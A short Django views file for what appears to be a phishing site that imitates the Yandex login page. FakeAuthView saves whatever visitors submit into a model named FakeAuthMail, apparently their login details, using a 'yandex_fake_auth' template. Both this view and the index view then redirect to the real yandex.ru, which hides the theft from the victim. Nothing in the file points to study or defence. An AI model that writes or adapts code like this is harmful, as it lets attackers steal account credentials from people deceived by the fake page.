from django.shortcuts import redirect
from django.views.generic.edit import CreateView

from .models.fakeauth import FakeAuthMail
from .forms import FakeAuthForm


def index(request):
    return redirect('https://yandex.ru')


class FakeAuthView(CreateView):
    model = FakeAuthMail
    form_class = FakeAuthForm
    template_name = 'yandex_fake_auth.html'
    success_url = 'https://yandex.ru'
